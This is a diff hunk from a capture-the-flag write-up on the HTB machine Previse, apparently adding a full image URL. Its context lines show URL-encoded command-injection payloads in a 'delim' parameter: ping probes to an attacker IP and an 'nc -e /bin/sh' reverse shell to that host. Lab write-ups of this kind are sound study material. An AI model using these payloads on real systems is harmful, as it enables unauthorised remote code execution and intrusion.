@@ -121,7 +121,7 @@ The payload for this request looks like it is vulnerable to command injection. W
 delim=comma%7Cping%20-n%2021%2010.10.16.250%7C%7C%60ping%20-c%2021%2010.10.16.250%60%20%23%27%20%7Cping%20-n%2021%2010.10.16.250%7C%7C%60ping%20-c%2021%2010.10.16.250%60%20%23%5C%22%20%7Cping%20-n%2021%2010.10.16.250
 ```
 The ```ping``` requests were captured by wireshark, which proved that the POC worked.
-![](ping_requests.PNG)
+![Ping requests captured](https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/ping_requests.PNG)
 
 Now all we have to do, is to create a reverse shell to connect to ```10.10.11.104```. The payload used is ```delim=comma%7Cnc%20-e%20%2Fbin%2Fsh%2010.10.16.250%203000``` and we will create a listening shell on the attacker machine. Afterwards, we will establish the shell.
 ```code
